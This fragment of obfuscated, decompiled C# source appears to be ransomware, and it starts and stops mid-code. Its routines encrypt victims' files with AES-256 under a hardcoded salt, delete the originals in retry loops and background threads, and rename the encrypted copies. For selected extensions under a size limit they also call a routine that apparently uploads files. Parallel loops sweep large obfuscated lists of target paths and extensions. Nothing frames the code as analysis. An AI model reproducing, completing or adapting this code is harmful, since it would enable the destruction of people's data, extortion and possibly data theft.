											File.AppendAllText(ggXwxjUYnLoRjW, rSXtOPrCvtb.getString_0(107392674) + CS_0024_003C_003E8__locals0.kQgEkWZKOGq + rSXtOPrCvtb.getString_0(107392952) + ex6.Message + rSXtOPrCvtb.getString_0(107396316));
										}
										catch (Exception)
										{
										}
									}
									XqcQqptBktg++;
									return;
								}
							}
						}
						else if (!YSyraIcgHbsYy)
						{
							if (!TbNpXAhfsSvoF)
							{
								ojeaCIHIdAVcU(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, CS_0024_003C_003E8__locals0.kQgEkWZKOGq + rSXtOPrCvtb.getString_0(107392929), IAhudorLPgiPTwRk);
							}
							else
							{
								ojeaCIHIdAVcU(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, CS_0024_003C_003E8__locals0.kQgEkWZKOGq + rSXtOPrCvtb.getString_0(107392929), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!TbNpXAhfsSvoF)
								{
									hrYMoqvOiHrwVxPM(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, CS_0024_003C_003E8__locals0.kQgEkWZKOGq, IAhudorLPgiPTwRk);
								}
								else
								{
									hrYMoqvOiHrwVxPM(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, CS_0024_003C_003E8__locals0.kQgEkWZKOGq, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (zHVjUhBGwaRp)
								{
									try
									{
										File.AppendAllText(ggXwxjUYnLoRjW, rSXtOPrCvtb.getString_0(107392674) + CS_0024_003C_003E8__locals0.kQgEkWZKOGq + rSXtOPrCvtb.getString_0(107392952) + ex8.Message + rSXtOPrCvtb.getString_0(107396316));
									}
									catch (Exception)
									{
									}
								}
								XqcQqptBktg++;
								return;
							}
						}
						if (TbNpXAhfsSvoF)
						{
							if (CS_0024_003C_003E8__locals0.qpFQFAvWuxf != rSXtOPrCvtb.getString_0(107392934))
							{
								eCfTjekYzSTzH(CS_0024_003C_003E8__locals0.kQgEkWZKOGq + CS_0024_003C_003E8__locals0.qpFQFAvWuxf, bytes2);
							}
							else
							{
								eCfTjekYzSTzH(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_07bb;
			IL_07bb:
			CS_0024_003C_003E8__locals0.WKleAlszVWX.Remove(CS_0024_003C_003E8__locals0.kQgEkWZKOGq);
		});
	}

	private static void JeXvaumsMxw(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (tcOSbsOVOaUxj == getString_0(107396921))
					{
						foreach (string item in DBmcqQetlZqvO)
						{
							if (string_0.ToLower().EndsWith(item) && lPDturpXzJaF == getString_0(107396921))
							{
								if (Convert.ToInt32(vTzmcFSquAlN) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										SVIZsHmxRViwKya.IgglYVHgoJ(getString_0(107394885), getString_0(107394880), getString_0(107394835), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && lPDturpXzJaF == getString_0(107396958))
							{
								try
								{
									SVIZsHmxRViwKya.IgglYVHgoJ(getString_0(107394885), getString_0(107394880), getString_0(107394835), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107392912)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107392912), getString_0(107394772)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void hrYMoqvOiHrwVxPM(string string_0, string string_1, byte[] byte_0)
	{
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		if (tcOSbsOVOaUxj == getString_0(107396921))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in DBmcqQetlZqvO)
			{
				if (string_0.ToLower().EndsWith(item) && lPDturpXzJaF == getString_0(107396921))
				{
					if (Convert.ToInt32(vTzmcFSquAlN) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							SVIZsHmxRViwKya.IgglYVHgoJ(getString_0(107394885), getString_0(107394880), getString_0(107394835), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && lPDturpXzJaF == getString_0(107396958))
				{
					try
					{
						SVIZsHmxRViwKya.IgglYVHgoJ(getString_0(107394885), getString_0(107394880), getString_0(107394835), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = aVFnshiIDktw.CpumuidTlJzV(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		LyRFRlRmWuJeh++;
	}

	private static void ojeaCIHIdAVcU(string string_0, string string_1, byte[] byte_0)
	{
		IvSFWLZvnk CS_0024_003C_003E8__locals0 = new IvSFWLZvnk();
		CS_0024_003C_003E8__locals0.nwnNekRDkPJrC = string_0;
		CS_0024_003C_003E8__locals0.CDUkqUCBaZtie = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string cDUkqUCBaZtie = CS_0024_003C_003E8__locals0.CDUkqUCBaZtie;
			FileStream fileStream = new FileStream(cDUkqUCBaZtie, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (LqtEdmbXXRZ == getString_0(107396921))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.nwnNekRDkPJrC, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.nwnNekRDkPJrC, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.nwnNekRDkPJrC, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.CDUkqUCBaZtie.Length > 0)
				{
					if (tcOSbsOVOaUxj == getString_0(107396921))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.nwnNekRDkPJrC, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in DBmcqQetlZqvO)
						{
							if (CS_0024_003C_003E8__locals0.nwnNekRDkPJrC.ToLower().EndsWith(item) && lPDturpXzJaF == getString_0(107396921))
							{
								if (Convert.ToInt32(vTzmcFSquAlN) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										SVIZsHmxRViwKya.IgglYVHgoJ(getString_0(107394885), getString_0(107394880), getString_0(107394835), CS_0024_003C_003E8__locals0.nwnNekRDkPJrC);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.nwnNekRDkPJrC.ToLower().EndsWith(item) && lPDturpXzJaF == getString_0(107396958))
							{
								try
								{
									SVIZsHmxRViwKya.IgglYVHgoJ(getString_0(107394885), getString_0(107394880), getString_0(107394835), CS_0024_003C_003E8__locals0.nwnNekRDkPJrC);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.nwnNekRDkPJrC);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.CDUkqUCBaZtie.EndsWith(getString_0(107392912)))
					{
						File.Move(CS_0024_003C_003E8__locals0.CDUkqUCBaZtie, CS_0024_003C_003E8__locals0.CDUkqUCBaZtie.Replace(getString_0(107392912), getString_0(107394772)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.CDUkqUCBaZtie))
							{
								File.Delete(CS_0024_003C_003E8__locals0.CDUkqUCBaZtie);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (zHVjUhBGwaRp)
			{
				try
				{
					File.AppendAllText(ggXwxjUYnLoRjW, getString_0(107392657) + CS_0024_003C_003E8__locals0.nwnNekRDkPJrC + getString_0(107392935) + ex2.Message + getString_0(107396299));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> source = qWQrDBFHeAID;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				sWjtOXvcFWJH(getString_0(107392338), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		List<string> ggaVyXoqvMsv = GgaVyXoqvMsv;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
			{
				sWjtOXvcFWJH(getString_0(107392361), string_0);
			};
		}
		Parallel.ForEach(ggaVyXoqvMsv, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		List<string> ggNBPkMzCW = GgNBPkMzCW;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				sWjtOXvcFWJH(hIhPBIfOSm(getString_0(107392348)), string_0);
			};
		}
		Parallel.ForEach(ggNBPkMzCW, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		if (AdgkTwblBwipT == getString_0(107396921))
		{
			string[] source2 = cYsXlGDBtenOhBicM;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
				{
					sWjtOXvcFWJH(hIhPBIfOSm(getString_0(107392348)), getString_0(107392323) + string_0 + getString_0(107392282));
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		}
		if (!PfYreukyJoUWR().Contains(getString_0(107393067)))
		{
			lQcOiTDWMmD(rbrkDaqDuTVbVK);
		}
		else
		{
			List<string> ppoSMzkyzp = PpoSMzkyzp;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
				{
					sWjtOXvcFWJH(hIhPBIfOSm(nTkHQcdXRpJsk(getString_0(107392277))), string_0);
				};
			}
			Parallel.ForEach(ppoSMzkyzp, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		}
		List<string> wkxnuQfXvISBG = WkxnuQfXvISBG;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
			{
				sWjtOXvcFWJH(hIhPBIfOSm(getString_0(107392284)), string_0);
			};
		}
		Parallel.ForEach(wkxnuQfXvISBG, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		List<string> jmlNpNnlAKvHk = JmlNpNnlAKvHk;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
			{
				sWjtOXvcFWJH(getString_0(107392267), string_0);
			};
		}
		Parallel.ForEach(jmlNpNnlAKvHk, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		sWjtOXvcFWJH(getString_0(107392338), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		sWjtOXvcFWJH(getString_0(107392361), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		sWjtOXvcFWJH(hIhPBIfOSm(getString_0(107392348)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		sWjtOXvcFWJH(hIhPBIfOSm(getString_0(107392348)), getString_0(107392323) + string_0 + getString_0(107392282));
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		sWjtOXvcFWJH(hIhPBIfOSm(nTkHQcdXRpJsk(getString_0(107392277))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		sWjtOXvcFWJH(hIhPBIfOSm(getString_0(107392284)), string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		sWjtOXvcFWJH(getString_0(107392267), string_0);
	}

	static GGXHsdxTjwNJn()
	{
		Strings.CreateGetStringDelegate(typeof(GGXHsdxTjwNJn));
		sKzNWrhzGAHRr = getString_0(107394748);
		IAhudorLPgiPTwRk = null;
		meUKxegfAGyfS = getString_0(107396958);
		pmJIDUymRvUZ = getString_0(107392258);
		EcgGAETsov = new List<string>();
		OUPhHReCiHtccg = new List<string>();
		nbRlreJjYNc = getString_0(107396958);
		URYiBrqszv = getString_0(107394772);
		FgyHjghKYuZ = getString_0(107394772);
		FjzTNiXFSgoZj = getString_0(107396958);
		GjqVVyxomVPsTn = 0;
		PWWVJdGDCC = getString_0(107396958);
		xzJYEoEovCIqNw = getString_0(107396958);
		PRmrECFDgTeq = getString_0(107396958);
		LWmXuPbBciXx = getString_0(107392213);
		PbDAbEmHsx = getString_0(107396958);
		JUUZXlwdaPe = getString_0(107396958);
		cVkPMpQcREO = getString_0(107396958);
		bRwScDBJwDeBYd = getString_0(107396958);
		mFfWxNueUchlK = new List<string>
		{
			hIhPBIfOSm(getString_0(107392208)),
			hIhPBIfOSm(getString_0(107392223)),
			hIhPBIfOSm(getString_0(107392198)),
			hIhPBIfOSm(getString_0(107392149)),
			hIhPBIfOSm(getString_0(107392156)),
			hIhPBIfOSm(getString_0(107392131)),
			hIhPBIfOSm(getString_0(107392594)),
			hIhPBIfOSm(getString_0(107392569)),
			hIhPBIfOSm(getString_0(107392576)),
			hIhPBIfOSm(getString_0(107392551)),
			hIhPBIfOSm(getString_0(107392502)),
			hIhPBIfOSm(getString_0(107392509)),
			hIhPBIfOSm(getString_0(107392484))
		};
		jNwNlNdFEttBjzB = new List<string>();
		zLVcPKHFvCikcqa = getString_0(107396958);
		MiAyaKFsjIg = getString_0(107396958);
		PPGcDwbrHSPlf = getString_0(107396958);
		AELBNwHYCcQQYjz = new List<string>();
		thoaXawqBaLv = getString_0(107396958);
		JPIrVFeCRgotU = getString_0(107392459);
		ofigmZpzHvUS = getString_0(107396958);
		ofYOFXSvtaf = getString_0(107396958);
		GgaVyXoqvMsv = new List<string>
		{
			hIhPBIfOSm(getString_0(107392378)),
			hIhPBIfOSm(getString_0(107391833)),
			hIhPBIfOSm(getString_0(107391800)),
			hIhPBIfOSm(getString_0(107391767)),
			hIhPBIfOSm(getString_0(107391734)),
			hIhPBIfOSm(getString_0(107391705)),
			hIhPBIfOSm(getString_0(107391680)),
			hIhPBIfOSm(getString_0(107391651)),
			hIhPBIfOSm(getString_0(107392086)),
			hIhPBIfOSm(getString_0(107392021)),
			hIhPBIfOSm(getString_0(107391988)),
			hIhPBIfOSm(getString_0(107391955)),
			hIhPBIfOSm(getString_0(107391922)),
			hIhPBIfOSm(getString_0(107391893)),
			hIhPBIfOSm(getString_0(107391864)),
			hIhPBIfOSm(getString_0(107391311)),
			hIhPBIfOSm(getString_0(107391302)),
			hIhPBIfOSm(getString_0(107391213)),
			hIhPBIfOSm(getString_0(107391196)),
			hIhPBIfOSm(getString_0(107391131)),
			hIhPBIfOSm(getString_0(107391134)),
			hIhPBIfOSm(getString_0(107391573)),
			hIhPBIfOSm(getString_0(107391532)),
			hIhPBIfOSm(getString_0(107391531)),
			hIhPBIfOSm(getString_0(107391450)),
			hIhPBIfOSm(getString_0(107391425)),
			hIhPBIfOSm(getString_0(107391352)),
			hIhPBIfOSm(getString_0(107390811)),
			hIhPBIfOSm(getString_0(107390770)),
			hIhPBIfOSm(getString_0(107390713)),
			hIhPBIfOSm(getString_0(107390648)),
			hIhPBIfOSm(getString_0(107390623)),
			hIhPBIfOSm(getString_0(107391070)),
			hIhPBIfOSm(getString_0(107390989)),
			hIhPBIfOSm(getString_0(107390924)),
			hIhPBIfOSm(getString_0(107390867)),
			hIhPBIfOSm(getString_0(107390834)),
			hIhPBIfOSm(getString_0(107390313)),
			hIhPBIfOSm(getString_0(107390272)),
			hIhPBIfOSm(getString_0(107390195)),
			hIhPBIfOSm(getString_0(107390166)),
			hIhPBIfOSm(getString_0(107390101)),
			hIhPBIfOSm(getString_0(107390060)),
			hIhPBIfOSm(getString_0(107390571)),
			hIhPBIfOSm(getString_0(107390530)),
			hIhPBIfOSm(getString_0(107390449)),
			hIhPBIfOSm(getString_0(107390436)),
			hIhPBIfOSm(getString_0(107390331)),
			hIhPBIfOSm(getString_0(107389774)),
			hIhPBIfOSm(getString_0(107389761)),
			hIhPBIfOSm(getString_0(107389684)),
			hIhPBIfOSm(getString_0(107389675)),
			hIhPBIfOSm(getString_0(107389602)),
			hIhPBIfOSm(getString_0(107389573)),
			hIhPBIfOSm(getString_0(107390044)),
			hIhPBIfOSm(getString_0(107389947)),
			hIhPBIfOSm(getString_0(107389902)),
			hIhPBIfOSm(getString_0(107389873)),
			hIhPBIfOSm(getString_0(107389860)),
			hIhPBIfOSm(getString_0(107389283)),
			hIhPBIfOSm(getString_0(107389254)),
			hIhPBIfOSm(getString_0(107389165)),
			hIhPBIfOSm(getString_0(107389100)),
			hIhPBIfOSm(getString_0(107389091)),
			hIhPBIfOSm(getString_0(107389062)),
			hIhPBIfOSm(getString_0(107389533)),
			hIhPBIfOSm(getString_0(107389420)),
			hIhPBIfOSm(getString_0(107389359)),
			hIhPBIfOSm(getString_0(107389318)),
			hIhPBIfOSm(getString_0(107388729)),
			hIhPBIfOSm(getString_0(107388696)),
			hIhPBIfOSm(getString_0(107388655)),
			hIhPBIfOSm(getString_0(107388610)),
			hIhPBIfOSm(getString_0(107388533)),
			hIhPBIfOSm(getString_0(107388988)),
			hIhPBIfOSm(getString_0(107388939)),
			hIhPBIfOSm(getString_0(107388878)),
			hIhPBIfOSm(getString_0(107388869)),
			hIhPBIfOSm(getString_0(107388804)),
			hIhPBIfOSm(getString_0(107388211)),
			hIhPBIfOSm(getString_0(107388154)),
			hIhPBIfOSm(getString_0(107388121)),
			hIhPBIfOSm(getString_0(107388092)),
			hIhPBIfOSm(getString_0(107388035)),
			hIhPBIfOSm(getString_0(107390867)),
			hIhPBIfOSm(getString_0(107388490)),
			hIhPBIfOSm(getString_0(107388449)),
			hIhPBIfOSm(getString_0(107388360)),
			hIhPBIfOSm(getString_0(107388283)),
			hIhPBIfOSm(getString_0(107387742)),
			hIhPBIfOSm(getString_0(107387717)),
			hIhPBIfOSm(getString_0(107387640)),
			hIhPBIfOSm(getString_0(107387623)),
			hIhPBIfOSm(getString_0(107390713)),
			hIhPBIfOSm(getString_0(107387558)),
			hIhPBIfOSm(getString_0(107387517)),
			hIhPBIfOSm(getString_0(107387972)),
			hIhPBIfOSm(getString_0(107390648)),
			hIhPBIfOSm(getString_0(107387867)),
			hIhPBIfOSm(getString_0(107387850)),
			hIhPBIfOSm(getString_0(107387217)),
			hIhPBIfOSm(getString_0(107387152)),
			hIhPBIfOSm(getString_0(107387135)),
			hIhPBIfOSm(getString_0(107391070)),
			hIhPBIfOSm(getString_0(107387026)),
			hIhPBIfOSm(getString_0(107390834)),
			hIhPBIfOSm(getString_0(107390989)),
			hIhPBIfOSm(getString_0(107386993)),
			hIhPBIfOSm(getString_0(107387448)),
			hIhPBIfOSm(getString_0(107390924)),
			hIhPBIfOSm(getString_0(107387415)),
			hIhPBIfOSm(getString_0(107387398)),
			hIhPBIfOSm(getString_0(107387317)),
			hIhPBIfOSm(getString_0(107390770)),
			hIhPBIfOSm(getString_0(107387324)),
			hIhPBIfOSm(getString_0(107387247)),
			hIhPBIfOSm(getString_0(107386706)),
			hIhPBIfOSm(getString_0(107386677)),
			hIhPBIfOSm(getString_0(107386664)),
			hIhPBIfOSm(getString_0(107386631)),
			hIhPBIfOSm(getString_0(107386574)),
			hIhPBIfOSm(getString_0(107386561)),
			hIhPBIfOSm(getString_0(107386536)),
			hIhPBIfOSm(getString_0(107386495)),
			hIhPBIfOSm(getString_0(107386930)),
			hIhPBIfOSm(getString_0(107386913)),
			hIhPBIfOSm(getString_0(107386856)),
			hIhPBIfOSm(getString_0(107386823)),
			hIhPBIfOSm(getString_0(107386746)),
			hIhPBIfOSm(getString_0(107386201)),
			hIhPBIfOSm(getString_0(107386160)),
			hIhPBIfOSm(getString_0(107390811)),
			hIhPBIfOSm(getString_0(107386913)),
			hIhPBIfOSm(getString_0(107386151)),
			hIhPBIfOSm(getString_0(107386122)),
			hIhPBIfOSm(getString_0(107386061)),
			hIhPBIfOSm(getString_0(107386044)),
			hIhPBIfOSm(getString_0(107385971)),
			hIhPBIfOSm(getString_0(107386422)),
			hIhPBIfOSm(getString_0(107386349)),
			hIhPBIfOSm(getString_0(107386320)),
			hIhPBIfOSm(getString_0(107386287)),
			hIhPBIfOSm(getString_0(107386246)),
			hIhPBIfOSm(getString_0(107385705)),
			hIhPBIfOSm(getString_0(107385660)),
			hIhPBIfOSm(getString_0(107385563)),
			hIhPBIfOSm(getString_0(107385530)),
			hIhPBIfOSm(getString_0(107385485)),
			hIhPBIfOSm(getString_0(107385936)),
			hIhPBIfOSm(getString_0(107385903)),
			hIhPBIfOSm(getString_0(107385890)),
			hIhPBIfOSm(getString_0(107385825)),
			hIhPBIfOSm(getString_0(107385792)),
			hIhPBIfOSm(getString_0(107385719)),
			hIhPBIfOSm(getString_0(107385190)),
			hIhPBIfOSm(getString_0(107391450)),
			hIhPBIfOSm(getString_0(107385161)),
			hIhPBIfOSm(getString_0(107385072)),
			hIhPBIfOSm(getString_0(107385063)),
			hIhPBIfOSm(getString_0(107384986)),
			hIhPBIfOSm(getString_0(107384945)),
			hIhPBIfOSm(getString_0(107385444)),
			hIhPBIfOSm(getString_0(107385383)),
			hIhPBIfOSm(getString_0(107385302)),
			hIhPBIfOSm(getString_0(107385285)),
			hIhPBIfOSm(getString_0(107385196)),
			hIhPBIfOSm(getString_0(107384627)),
			hIhPBIfOSm(getString_0(107384614)),
			hIhPBIfOSm(getString_0(107384573)),
			hIhPBIfOSm(getString_0(107384516)),
			hIhPBIfOSm(getString_0(107391425)),
			hIhPBIfOSm(getString_0(107384923)),
			hIhPBIfOSm(getString_0(107384926)),
			hIhPBIfOSm(getString_0(107384893)),
			hIhPBIfOSm(getString_0(107384820)),
			hIhPBIfOSm(getString_0(107384791)),
			hIhPBIfOSm(getString_0(107391531)),
			hIhPBIfOSm(getString_0(107384750)),
			hIhPBIfOSm(getString_0(107384733)),
			hIhPBIfOSm(getString_0(107384704)),
			hIhPBIfOSm(getString_0(107389254)),
			hIhPBIfOSm(getString_0(107384159)),
			hIhPBIfOSm(getString_0(107384704)),
			hIhPBIfOSm(getString_0(107384130)),
			hIhPBIfOSm(getString_0(107384101)),
			hIhPBIfOSm(getString_0(107384072)),
			hIhPBIfOSm(getString_0(107383991)),
			hIhPBIfOSm(getString_0(107383974)),
			hIhPBIfOSm(getString_0(107383933)),
			hIhPBIfOSm(getString_0(107384384)),
			hIhPBIfOSm(getString_0(107384355)),
			hIhPBIfOSm(getString_0(107384282)),
			hIhPBIfOSm(getString_0(107384237)),
			hIhPBIfOSm(getString_0(107384224)),
			hIhPBIfOSm(getString_0(107384191)),
			hIhPBIfOSm(getString_0(107383622)),
			hIhPBIfOSm(getString_0(107383545)),
			hIhPBIfOSm(getString_0(107383520)),
			hIhPBIfOSm(getString_0(107383487)),
			hIhPBIfOSm(getString_0(107383414)),
			hIhPBIfOSm(getString_0(107383897)),
			hIhPBIfOSm(getString_0(107383868)),
			hIhPBIfOSm(getString_0(107383803)),
			hIhPBIfOSm(getString_0(107383778)),
			hIhPBIfOSm(getString_0(107383705)),
			hIhPBIfOSm(getString_0(107383688)),
			hIhPBIfOSm(getString_0(107383143)),
			hIhPBIfOSm(getString_0(107383062)),
			hIhPBIfOSm(getString_0(107383049)),
			hIhPBIfOSm(getString_0(107382968)),
			hIhPBIfOSm(getString_0(107382955)),
			hIhPBIfOSm(getString_0(107383386)),
			hIhPBIfOSm(getString_0(107383353)),
			hIhPBIfOSm(getString_0(107383312)),
			hIhPBIfOSm(getString_0(107383303)),
			hIhPBIfOSm(getString_0(107383226)),
			hIhPBIfOSm(getString_0(107385971)),
			hIhPBIfOSm(getString_0(107383193)),
			hIhPBIfOSm(getString_0(107383152)),
			hIhPBIfOSm(getString_0(107382583)),
			hIhPBIfOSm(getString_0(107382554)),
			hIhPBIfOSm(getString_0(107382521)),
			hIhPBIfOSm(getString_0(107382488)),
			hIhPBIfOSm(getString_0(107382471)),
			hIhPBIfOSm(getString_0(107382442)),
			hIhPBIfOSm(getString_0(107382397)),
			hIhPBIfOSm(getString_0(107382832)),
			hIhPBIfOSm(getString_0(107382823)),
			hIhPBIfOSm(getString_0(107382734)),
			hIhPBIfOSm(getString_0(107382717)),
			hIhPBIfOSm(getString_0(107382688)),
			hIhPBIfOSm(getString_0(107382099))
		};
		qWQrDBFHeAID = new List<string>
		{
			hIhPBIfOSm(getString_0(107382090)),
			hIhPBIfOSm(getString_0(107382009)),
			hIhPBIfOSm(getString_0(107381992)),
			hIhPBIfOSm(getString_0(107381911)),
			hIhPBIfOSm(getString_0(107381894)),
			hIhPBIfOSm(getString_0(107382341)),
			hIhPBIfOSm(getString_0(107382232)),
			hIhPBIfOSm(getString_0(107382171))
		};
		GgNBPkMzCW = new List<string>
		{
			hIhPBIfOSm(getString_0(107382146)),
			hIhPBIfOSm(getString_0(107381601)),
			hIhPBIfOSm(getString_0(107381524)),
			hIhPBIfOSm(getString_0(107381507)),
			hIhPBIfOSm(getString_0(107381474)),
			hIhPBIfOSm(getString_0(107381393)),
			hIhPBIfOSm(getString_0(107381380)),
			hIhPBIfOSm(getString_0(107381859)),
			hIhPBIfOSm(getString_0(107381826)),
			hIhPBIfOSm(getString_0(107381793)),
			hIhPBIfOSm(getString_0(107381760)),
			hIhPBIfOSm(getString_0(107381727)),
			hIhPBIfOSm(getString_0(107381654)),
			hIhPBIfOSm(getString_0(107381613)),
			hIhPBIfOSm(getString_0(107381088)),
			hIhPBIfOSm(getString_0(107381055)),
			hIhPBIfOSm(getString_0(107380982)),
			hIhPBIfOSm(getString_0(107380949)),
			hIhPBIfOSm(getString_0(107380908)),
			hIhPBIfOSm(getString_0(107380899)),
			hIhPBIfOSm(getString_0(107380866)),
			hIhPBIfOSm(getString_0(107381305)),
			hIhPBIfOSm(getString_0(107381272)),
			hIhPBIfOSm(getString_0(107382146)),
			hIhPBIfOSm(getString_0(107381231)),
			hIhPBIfOSm(getString_0(107381222)),
